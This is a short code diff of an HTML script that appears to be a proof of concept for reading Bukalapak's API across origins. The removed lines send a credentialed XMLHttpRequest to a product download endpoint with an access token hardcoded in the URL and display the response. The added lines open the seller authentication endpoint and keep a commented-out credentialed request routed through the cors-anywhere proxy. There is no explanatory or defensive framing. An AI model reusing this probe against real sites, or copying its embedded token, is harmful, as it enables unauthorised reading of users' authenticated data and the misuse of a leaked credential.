@@ -1,19 +1,20 @@
 <script>
-var x = new XMLHttpRequest();
-
-  x.onreadystatechange = function() {
-    if (x.readyState == XMLHttpRequest.DONE) {
-      alert(x.response);
-    }
-  }
-
-function cors(){
-  if(x) {
-    x.open('GET', "https://api.bukalapak.com/products/download?mode=*&product_ids%5B%5D=2xnb8sy&access_token=PbAbTpHcyfCeAOcqFq0O0wOiTUT8I0VktrcuDa2g2iu96w", true);
-    x.withCredentials = true;
-    x.send();
-  }
-}
-
-cors();
+window.open("https://seller.bukalapak.com/api/authenticate");
+// var x = new XMLHttpRequest();
+//
+//   x.onreadystatechange = function() {
+//     if (x.readyState == XMLHttpRequest.DONE) {
+//       console.log(x);
+//     }
+//   }
+//
+// function cors(){
+//   if(x) {
+//     x.open('GET', "https://cors-anywhere.herokuapp.com/https://seller.bukalapak.com/api/authenticate", true);
+//     x.withCredentials = true;
+//     x.send();
+//   }
+// }
+//
+// cors();
 </script>
